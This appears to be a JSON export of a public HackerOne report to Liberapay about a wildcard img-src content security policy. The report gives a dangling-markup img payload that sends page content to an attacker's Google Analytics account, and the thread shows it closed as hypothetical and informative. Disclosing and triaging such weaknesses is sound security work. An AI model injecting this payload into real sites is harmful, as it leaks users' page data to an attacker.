{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "informative", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "0x08"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 360864, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-06-02T13:02:19.030Z", 
    "vulnerability_information": "Hi Team,\n\n#### Summary\nWhile reviewing the CSP headers for en.liberapay.com i noticed that img-src has a source set to * which means any source on the internet. The following is found in the current CSP Header config.\n\n```img-src * blob: data:```\n\n### Description:\nIf the site is vulnerable to HTML Injection its possible to use sources like www.google-analytics.com and inject a malicious html like the below\n\n```html\n<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=\n```\nIf you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected <img src> tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.\n\n### Mitigation:\nIf you feel that the site doesn't need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)\n\n\n### References:\nGithub  https://githubengineering.com/githubs-post-csp-journey\nHackerone  https://hackerone.com/reports/199779\nDetectify (good explanation)  https://labs.detectify.com/2018/01/19/google-analytics-data-extraction\n\n## Impact\n\nThis CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.\n\nRegards,\nNthack", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "none", 
        "author_type": "Team"
    }, 
    "title": "Current CSP Policy chained with HTML Injection can lead to Data Exfiltration", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 7600, 
            "content": "In our view, this report was purely hypothetical and we would accept it if someone can demonstrate HTML injection with dangling markup.", 
            "content_html": "<p>In our view, this report was purely hypothetical and we would accept it if someone can demonstrate HTML injection with dangling markup.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "*.liberapay.com", 
        "max_severity": "critical", 
        "databaseId": 8926, 
        "asset_type": "URL"
    }, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Informative", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-06-01T17:33:30.981Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-01T17:33:30.981Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "liberapay", 
            "message": "Would it be possible to provide us with a proof of concept on liberapay.com that demonstrates HTML injection which abuses this potential issue? Without the HTML injection and a clear proof of concept, this report is purely hypothetical.", 
            "markdown_message": "<p>Would it be possible to provide us with a proof of concept on liberapay.com that demonstrates HTML injection which abuses this potential issue? Without the HTML injection and a clear proof of concept, this report is purely hypothetical.</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 2830222, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-01T17:36:31.876Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-01T17:36:31.876Z", 
            "actor": {
                "username": "pwnisher", 
                "url": "/pwnisher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/834/4fa8f4280223772c4f27d0bfc2f919346313fc8a_medium.jpg?1525205739"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "liberapay", 
            "message": "As of now, i dont have a HTML Injection, so yeah if you feel its purely hypothetical it can be closed as Informative.\n\nThanks\nNthack", 
            "markdown_message": "<p>As of now, i dont have a HTML Injection, so yeah if you feel its purely hypothetical it can be closed as Informative.</p>\n\n<p>Thanks<br>\nNthack</p>\n", 
            "type": "Activities::BugNew", 
            "id": 2830235, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-01T17:38:31.971Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-01T17:38:31.971Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "liberapay", 
            "message": "Closing this report as informative so as not to affect your reputation. If you manage to exploit this, please do report back and I will take another look at your report. Keep up the good work, @nthack!", 
            "markdown_message": "<p>Closing this report as informative so as not to affect your reputation. If you manage to exploit this, please do report back and I will take another look at your report. Keep up the good work, <a href=\"/nthack\">@nthack</a>!</p>\n", 
            "type": "Activities::BugInformative", 
            "id": 2830246, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-02T13:02:14.641Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-02T13:02:14.641Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "None", 
                "old_severity": "Low"
            }, 
            "team_handle": "liberapay", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2833069, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-02T13:02:19.064Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-02T13:02:19.064Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "liberapay", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2833070, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-04T11:52:36.879Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-04T11:52:36.879Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "liberapay", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 2838557, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "pwnisher", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/pwnisher", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/834/e8669b681df5c30090a9e64bf86b3455686482a9_small.jpg?1525205739"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-06-04T11:52:36.945Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/360864", 
    "created_at": "2018-06-01T17:25:20.828Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi Team,</p>\n\n<h4 id=\"summary\">Summary</h4>\n\n<p>While reviewing the CSP headers for en.liberapay.com i noticed that img-src has a source set to * which means any source on the internet. The following is found in the current CSP Header config.</p>\n\n<p><code>img-src * blob: data:</code></p>\n\n<h3 id=\"description\">Description:</h3>\n\n<p>If the site is vulnerable to HTML Injection its possible to use sources like <a href=\"/redirect?signature=099bb5a72b83f478e1d2126e9fd243dfd45afd3a&amp;url=http%3A%2F%2Fwww.google-analytics.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.google-analytics.com</span><i class=\"icon-external-link\"></i></a> and inject a malicious html like the below</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&#39;https://www.google-analytics.com/collect?v=1&amp;tid=UA-55300588-1&amp;cid=3121525717&amp;t=event&amp;ec=email&amp;el=2111515817&amp;cs=newsletter&amp;cm=email&amp;cn=062413&amp;cm1=1&amp;ea=\n</span></code></pre>\n<p>If you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected &lt;img src&gt; tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.</p>\n\n<h3 id=\"mitigation\">Mitigation:</h3>\n\n<p>If you feel that the site doesn&#39;t need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (<a title=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms\" href=\"/redirect?signature=a9eaf777ce814da3833abca35a4a3fd8b3ec503e&amp;url=https%3A%2F%2Fdevelopers.google.com%2Fanalytics%2Fdevguides%2Fcollection%2Fanalyticsjs%2Fsending-hits%23specifying_different_transport_mechanisms\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms</span><i class=\"icon-external-link\"></i></a>)</p>\n\n<h3 id=\"references\">References:</h3>\n\n<p>Github  <a title=\"https://githubengineering.com/githubs-post-csp-journey\" href=\"/redirect?signature=5eae305f3c7e790f79fad394e4f45690dde160d0&amp;url=https%3A%2F%2Fgithubengineering.com%2Fgithubs-post-csp-journey\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://githubengineering.com/githubs-post-csp-journey</span><i class=\"icon-external-link\"></i></a><br>\nHackerone  <a title=\"https://hackerone.com/reports/199779\" href=\"https://hackerone.com/reports/199779\">https://hackerone.com/reports/199779</a><br>\nDetectify (good explanation)  <a title=\"https://labs.detectify.com/2018/01/19/google-analytics-data-extraction\" href=\"/redirect?signature=3b60bef00671c71c188d146af85816f8457f18a7&amp;url=https%3A%2F%2Flabs.detectify.com%2F2018%2F01%2F19%2Fgoogle-analytics-data-extraction\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://labs.detectify.com/2018/01/19/google-analytics-data-extraction</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.</p>\n\n<p>Regards,<br>\nNthack</p>\n", 
    "severity_rating": "none", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://liberapay.com", 
            "about": "An open source platform designed to facilitate recurrent donations.", 
            "twitter_handle": "liberapay", 
            "name": "Liberapay"
        }, 
        "handle": "liberapay", 
        "url": "https://hackerone.com/liberapay", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/028/411/0782331e0ae0dfac7617ae2c5cc5f275a4a84ebe_small.?1524732576", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/028/411/eb1bc1321b1b84c9057c721f5705b51a93438fe2_medium.?1524732576"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 28411, 
        "default_currency": "usd"
    }, 
    "is_published": false
}